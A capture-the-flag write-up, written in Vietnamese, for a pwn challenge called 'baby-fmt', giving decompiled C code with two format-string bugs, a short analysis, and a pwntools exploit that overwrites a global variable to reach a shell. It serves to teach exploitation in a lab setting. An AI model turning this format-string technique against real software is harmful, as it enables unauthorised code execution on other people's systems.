# baby-fmt

## psuedo-code

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  __int64 buf[2]; // [rsp+0h] [rbp-A0h] BYREF
  char nptr[64]; // [rsp+10h] [rbp-90h] BYREF
  char format[72]; // [rsp+50h] [rbp-50h] BYREF
  int v8; // [rsp+98h] [rbp-8h]
  int fd; // [rsp+9Ch] [rbp-4h]

  init(argc, argv, envp);
  fd = open("/dev/urandom", 0);
  if ( fd < 0 )
  {
    puts("Something went wrong");
    exit(1);
  }
  read(fd, buf, 4uLL);
  v3 = time(buf);
  srand(v3);
  lucky = rand();
  puts("Viettel Challenge\n");
  printf("Give me your name: ");
  read(0, format, 0x3CuLL);
  printf("Hi guy,");
  printf(format);
  puts("\nCan you guess the lucky number?");
  printf("Your input: ");
  read(0, nptr, 0x3CuLL);
  printf("Your lucky is here: ");
  printf(nptr);
  v8 = atoi(nptr);
  if ( lucky != v8 )
  {
    puts("Good luck :D");
    exit(0);
  }
  puts("You are lucky man!");
  flag();
  return 0;
}
```

## Phân tích

Chương trình gọi hàm `rand()` sau đó gán giá trị trả về cho biến global `lucky`. Khi người dùng đoán đúng giá trị của `lucky` thì chương trình sẽ gọi hàm `flag()` spawn ra shell. Để đoán đúng được giá trị `lucky` thì có lẽ là điều không tưởng, nên ta sẽ tìm cách để ghi đè giá trị biến `lucky` với giá trị ta mong muốn. Ở chương trình này có tận 2 lỗi format string là `printf(nptr);` và `printf(format);`. Nhưng có lẽ chỉ cần 1 là đủ để ta đạt được mục đích.

## Exploit

```python
p = start()

offset = 16

writes = {
    0x06010CC: 1      # write lucky = 1
}
payload = fmtstr_payload(offset, writes)
p.sendafter(b'name: ',payload)
p.sendafter(b'input: ',b'1')
p.recvuntil(b'man!\n')
p.sendline(b'echo pwned')
p.interactive() 
```

payload chi tiết ở trong cùng thư mục nếu bạn muốn xem.
